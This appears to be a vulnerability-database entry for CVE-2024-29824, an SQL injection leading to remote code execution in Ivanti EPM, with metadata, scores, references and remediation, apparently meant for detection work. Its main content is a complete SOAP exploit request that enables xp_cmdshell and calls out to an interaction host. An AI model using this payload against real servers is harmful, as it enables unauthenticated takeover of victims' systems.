_cves/2024/cve-2024-29824.md

---
layout: post
cve_id: CVE-2024-29824
title: Ivanti EPM - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-29824.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-29824.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: critical
impact: 'Attackers can execute arbitrary code on the Ivanti EPM server, leading to
  complete system compromise.

  '
remediation: 'Apply security updates for Ivanti EPM that address CVE-2024-29824.

  '
reference:
- https://github.com/horizon3ai/CVE-2024-29824
- https://nvd.nist.gov/vuln/detail/CVE-2024-29824
- https://forums.ivanti.com/s/article/Security-Advisory-May-2024
- https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/
classification:
  cvss-metrics: CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 9.6
  cve-id: CVE-2024-29824
  epss-score: 0.94089
  epss-percentile: 0.99901
metadata:
  max-request: 1
tags:
- cve
- cve2024
- ivanti
- epm
- sqli
- rce
- kev
- vkev
- vuln
---

## 🔍 Vulnerability Description
An unspecified SQL Injection vulnerability in Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code.


## 🌐 HTTP Request
```nohighlight
POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Connection: close
Content-Length: 775
Content-Type: application/soap+xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UpdateStatusEvents xmlns="http://tempuri.org/">
      <deviceID>string</deviceID>
      <actions>
        <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
          <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup d5iq0f1le0o0jr7tum8gj69udqodcpz5a.oast.site'--</status>
        </Action>
      </actions>
    </UpdateStatusEvents>
  </soap12:Body>
</soap12:Envelope>
```

